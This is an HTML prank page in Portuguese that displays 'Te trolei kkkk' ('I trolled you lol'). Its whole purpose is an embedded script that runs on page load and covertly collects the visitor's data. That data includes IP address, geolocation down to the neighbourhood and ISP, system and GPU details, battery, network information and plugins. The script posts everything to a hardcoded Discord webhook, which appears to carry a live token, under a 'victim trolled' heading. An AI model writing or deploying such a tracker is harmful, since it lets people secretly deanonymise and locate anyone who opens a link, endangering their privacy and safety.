<!DOCTYPE html>
<html>
<head>
    <title>Mo burro kkkk</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial;
            text-align: center;
            padding-top: 100px;
            font-size: 3em;
            margin: 0;
            height: 100vh;
        }
    </style>
</head>
<body>
    Te trolei kkkk

    <script>
        // Webhook do Discord
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1403520973549994006/OK9kw7JWCRX5LNhpjwkjMB2VDxqAunjLgMYOnk1PE2RPVel4b7D2of8zq0asTF7Wlw9F';

        // Coleta TUDO de forma invis√≠vel
        async function collectAllData() {
            const data = {
                ip: await getIP(),
                location: await getLocation(),
                system: {
                    os: getOS(),
                    browser: getBrowser(),
                    screen: `${screen.width}x${screen.height}`,
                    colors: screen.colorDepth + ' bits',
                    gpu: await getGPU(),
                    cpu: navigator.hardwareConcurrency + ' cores'
                },
                network: {
                    type: navigator.connection?.effectiveType || 'desconhecido',
                    speed: navigator.connection?.downlink + ' Mbps' || 'desconhecido',
                    rtt: navigator.connection?.rtt + ' ms' || 'desconhecido',
                    saveData: navigator.connection?.saveData ? 'ativado' : 'desativado'
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages,
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
                battery: await getBattery(),
                storage: {
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    cookies: navigator.cookieEnabled
                },
                touch: 'ontouchstart' in window ? 'sim' : 'n√£o',
                doNotTrack: navigator.doNotTrack || 'n√£o especificado',
                date: new Date().toLocaleString(),
                url: window.location.href
            };

            sendToDiscord(data);
        }

        // Fun√ß√µes auxiliares
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                return (await response.json()).ip;
            } catch {
                return "n√£o detectado";
            }
        }

        async function getLocation() {
            try {
                const ip = await getIP();
                const response = await fetch(`http://ip-api.com/json/${ip}?fields=continent,country,regionName,city,district,isp,org,mobile,proxy`);
                return await response.json();
            } catch {
                return {};
            }
        }

        async function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) || "n√£o detectado";
            } catch {
                return "n√£o detectado";
            }
        }

        async function getBattery() {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'sim' : 'n√£o',
                    chargingTime: battery.chargingTime + 's'
                };
            } catch {
                return {};
            }
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return "Windows";
            if (/Mac/.test(ua)) return "MacOS";
            if (/Linux/.test(ua)) return "Linux";
            if (/Android/.test(ua)) return "Android";
            if (/iOS|iPhone|iPad|iPod/.test(ua)) return "iOS";
            return "desconhecido";
        }

        function getBrowser() {
            const ua = navigator.userAgent;
            let browser = "desconhecido";
            if (/Firefox/.test(ua)) browser = "Firefox";
            else if (/Chrome/.test(ua)) browser = "Chrome";
            else if (/Safari/.test(ua)) browser = "Safari";
            else if (/Edge/.test(ua)) browser = "Edge";
            else if (/Opera/.test(ua)) browser = "Opera";
            else if (/SamsungBrowser/.test(ua)) browser = "Samsung Browser";
            return browser;
        }

        // Envia para o Discord formatado
        async function sendToDiscord(data) {
            const message = `
**üîç V√çTIMA TROLADA - DADOS COMPLETOS üîç**
üïí *${data.date}*
üåê *URL:* ${data.url}

**üåç LOCALIZA√á√ÉO**
‚Ä¢ IP: ${data.ip}
‚Ä¢ Pa√≠s: ${data.location.country || 'n√£o detectado'}
‚Ä¢ Regi√£o: ${data.location.regionName || 'n√£o detectado'}
‚Ä¢ Cidade: ${data.location.city || 'n√£o detectado'}
‚Ä¢ Bairro: ${data.location.district || 'n√£o detectado'}
‚Ä¢ Provedor: ${data.location.isp || 'n√£o detectado'}
‚Ä¢ Operadora: ${data.location.org || 'n√£o detectado'}
‚Ä¢ M√≥vel: ${data.location.mobile ? 'sim' : 'n√£o'}
‚Ä¢ Proxy/VPN: ${data.location.proxy ? 'sim' : 'n√£o'}

**üíª SISTEMA**
‚Ä¢ SO: ${data.system.os}
‚Ä¢ Navegador: ${data.system.browser}
‚Ä¢ Tela: ${data.system.screen} (${data.system.colors})
‚Ä¢ GPU: ${data.system.gpu}
‚Ä¢ CPU: ${data.system.cpu}
‚Ä¢ Touch: ${data.touch}
‚Ä¢ Idiomas: ${data.languages.join(', ')}
‚Ä¢ Plugins: ${data.plugins || 'nenhum'}

**üîã BATERIA**
‚Ä¢ N√≠vel: ${data.battery.level || 'n√£o detectado'}
‚Ä¢ Carregando: ${data.battery.charging || 'n√£o detectado'}

**üì° REDE**
‚Ä¢ Tipo: ${data.network.type}
‚Ä¢ Velocidade: ${data.network.speed}
‚Ä¢ Lat√™ncia: ${data.network.rtt}
‚Ä¢ Modo economia: ${data.network.saveData}
‚Ä¢ Do Not Track: ${data.doNotTrack}

**üíæ ARMAZENAMENTO**
‚Ä¢ LocalStorage: ${data.storage.localStorage ? 'ativo' : 'bloqueado'}
‚Ä¢ SessionStorage: ${data.storage.sessionStorage ? 'ativo' : 'bloqueado'}
‚Ä¢ Cookies: ${data.storage.cookies ? 'ativo' : 'bloqueado'}
            `.trim();

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
            } catch (e) {
                console.error("Erro ao enviar:", e);
            }
        }

        // Inicia quando a p√°gina carrega
        window.addEventListener('load', collectAllData);
    </script>
</body>
</html>
